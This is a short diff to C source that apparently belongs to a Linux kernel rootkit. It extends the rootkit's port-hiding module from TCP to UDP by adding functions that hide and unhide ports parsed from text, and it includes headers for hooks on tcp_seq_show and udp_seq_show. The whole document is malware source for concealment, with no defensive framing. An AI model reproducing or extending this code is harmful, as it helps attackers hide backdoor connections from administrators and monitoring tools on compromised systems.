@@ -1,8 +1,10 @@
 #include "hideport.h"
 #include "../hooker/tcp_seq_show.h"
+#include "../hooker/udp_seq_show.h"
 
 
-int get_number_from_text(char *content) {
+int get_number_from_text(char *content)
+{
     int i;
     long port;
     char *numbers;
@@ -21,10 +23,22 @@ int get_number_from_text(char *content) {
     return port;
 }
 
-void hide_port(char *content) {
-    add_hidden_port(get_number_from_text(content));
+void hide_tcp_port(char *content)
+{
+    add_hidden_tcp_port(get_number_from_text(content));
 }
 
-void show_hidden_port(char *content) {
-    remove_hidden_port(get_number_from_text(content));
+void show_hidden_tcp_port(char *content)
+{
+    remove_hidden_tcp_port(get_number_from_text(content));
+}
+
+void hide_udp_port(char *content)
+{
+    add_hidden_udp_port(get_number_from_text(content));
+}
+
+void show_hidden_udp_port(char *content)
+{
+    remove_hidden_udp_port(get_number_from_text(content));
 }
